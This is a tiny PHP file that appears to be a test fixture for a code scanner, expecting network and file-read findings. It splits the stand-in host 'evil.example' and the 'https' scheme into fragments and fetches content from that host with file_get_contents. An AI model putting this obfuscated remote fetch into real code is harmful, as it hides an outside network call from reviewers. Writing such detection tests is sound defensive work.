<?php
// @expect: NETWORK, FILE_READ
$host = 'ev' . 'il.example';
$data = file_get_contents('ht' . 'tps://' . $host . '/c');
